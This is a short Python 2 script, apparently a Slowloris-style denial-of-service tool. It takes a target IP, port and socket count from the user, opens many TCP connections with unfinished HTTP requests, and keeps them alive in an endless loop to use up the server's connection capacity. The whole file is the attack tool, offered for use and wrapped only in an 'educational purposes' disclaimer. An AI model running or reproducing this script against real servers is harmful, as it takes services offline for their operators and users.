import os, socket

def newSocket(ip, port):
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPv4, TCP
		soc.connect((ip, port))
		soc.send("Get /? HTTP/1.1\r\n") #Bare Minimum HTTP Request without closing.
		return soc
	except:
		return

if __name__ == "__main__":
	os.system("clear")
	print("Created by: Heliuman")
	print(
	"Disclaimer...\n"
	"\tThis script is for educational purposes only.\n"
	"\tDo not attempt to perform this on a real server.\n"
	"\tUse at your own responsibility."
	)
	print("============================================================")
	ip = raw_input("Enter target IP: ")
	while ip == "":
		ip = raw_input("Target IP cannot be empty! Enter target IP: ")
	port = int(raw_input("Target port (Default '80'): ") or 80)
	sockets = int(raw_input("Number Of sockets (Default '256'): ") or 256)
	print("============================================================")
	print('Running Attack on: {}:{}, with {} sockets'.format(ip, port, sockets))
	
	socketsArray = []
	for _ in range(sockets):
		socketsArray.append(newSocket(ip, port))

	while(True):
		for soc in socketsArray:
			try:
				soc.send(" ")
			except socket.error:
				continue